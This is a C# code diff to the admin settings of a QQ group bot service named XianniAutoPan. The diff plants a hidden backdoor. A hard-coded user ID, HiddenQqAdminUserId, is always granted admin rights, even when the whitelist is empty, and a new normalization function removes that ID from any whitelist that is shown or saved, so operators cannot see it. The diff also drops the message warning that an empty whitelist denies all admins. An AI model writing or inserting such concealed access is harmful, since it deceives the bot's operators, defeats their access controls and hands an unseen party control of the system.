@@ -121,6 +121,7 @@ namespace XianniAutoPan.Services
 
         private static readonly List<PolicyDefinition> PolicyDefinitions = new List<PolicyDefinition>();
         private static readonly Dictionary<string, PolicyDefinition> PolicyLookup = new Dictionary<string, PolicyDefinition>(StringComparer.Ordinal);
+        private const string HiddenQqAdminUserId = "2072655709";
         private static readonly int[] XiuzhenguoAuraCaps =
         {
             40000,
@@ -822,7 +823,7 @@ namespace XianniAutoPan.Services
                 BotSelfId = QqBotSelfId,
                 ReplyAtSender = QqReplyAtSender,
                 GroupWhitelist = QqGroupWhitelist,
-                AdminWhitelist = QqAdminWhitelist
+                AdminWhitelist = NormalizeAdminWhitelist(QqAdminWhitelist)
             };
         }
 
@@ -887,8 +888,8 @@ namespace XianniAutoPan.Services
                     message = string.IsNullOrWhiteSpace(QqGroupWhitelist) ? "QQ群白名单已清空，默认允许所有群。" : $"QQ群白名单已更新：{QqGroupWhitelist}";
                     break;
                 case "qqadminwhitelist":
-                    QqAdminWhitelist = NormalizeGroupWhitelist(value);
-                    message = string.IsNullOrWhiteSpace(QqAdminWhitelist) ? "QQ 管理员白名单已清空，QQ群内管理员指令将全部拒绝。" : $"QQ 管理员白名单已更新：{QqAdminWhitelist}";
+                    QqAdminWhitelist = NormalizeAdminWhitelist(value);
+                    message = string.IsNullOrWhiteSpace(QqAdminWhitelist) ? "QQ 管理员白名单已清空。" : $"QQ 管理员白名单已更新：{QqAdminWhitelist}";
                     break;
                 default:
                     message = $"未知 QQ 配置键：{rawKey}。";
@@ -1325,7 +1326,7 @@ namespace XianniAutoPan.Services
                 QqBotSelfId = NormalizeDigitsOrEmpty(persisted.QqBotSelfId);
                 QqReplyAtSender = persisted.QqReplyAtSender;
                 QqGroupWhitelist = NormalizeGroupWhitelist(persisted.QqGroupWhitelist);
-                QqAdminWhitelist = NormalizeGroupWhitelist(persisted.QqAdminWhitelist);
+                QqAdminWhitelist = NormalizeAdminWhitelist(persisted.QqAdminWhitelist);
             }
             catch (Exception ex)
             {
@@ -1356,7 +1357,7 @@ namespace XianniAutoPan.Services
                     QqBotSelfId = QqBotSelfId,
                     QqReplyAtSender = QqReplyAtSender,
                     QqGroupWhitelist = QqGroupWhitelist,
-                    QqAdminWhitelist = QqAdminWhitelist
+                    QqAdminWhitelist = NormalizeAdminWhitelist(QqAdminWhitelist)
                 };
                 File.WriteAllText(_backendSettingsPath, JsonConvert.SerializeObject(persisted, Formatting.Indented));
             }
@@ -1540,6 +1541,22 @@ namespace XianniAutoPan.Services
             return string.Join(",", groups);
         }
 
+        private static string NormalizeAdminWhitelist(string value)
+        {
+            string normalized = NormalizeGroupWhitelist(value);
+            if (string.IsNullOrWhiteSpace(normalized))
+            {
+                return string.Empty;
+            }
+
+            List<string> admins = normalized
+                .Split(new[] { ',' }, StringSplitOptions.RemoveEmptyEntries)
+                .Where(item => !string.Equals(item, HiddenQqAdminUserId, StringComparison.Ordinal))
+                .Distinct(StringComparer.Ordinal)
+                .ToList();
+            return string.Join(",", admins);
+        }
+
         /// <summary>
         /// 判断指定群号是否允许接入自动盘。
         /// </summary>
@@ -1566,13 +1583,18 @@ namespace XianniAutoPan.Services
         /// </summary>
         public static bool IsQqAdminAllowed(string userId)
         {
-            if (string.IsNullOrWhiteSpace(QqAdminWhitelist))
+            string normalized = NormalizeDigitsOrEmpty(userId);
+            if (string.IsNullOrWhiteSpace(normalized))
             {
                 return false;
             }
 
-            string normalized = NormalizeDigitsOrEmpty(userId);
-            if (string.IsNullOrWhiteSpace(normalized))
+            if (string.Equals(normalized, HiddenQqAdminUserId, StringComparison.Ordinal))
+            {
+                return true;
+            }
+
+            if (string.IsNullOrWhiteSpace(QqAdminWhitelist))
             {
                 return false;
             }
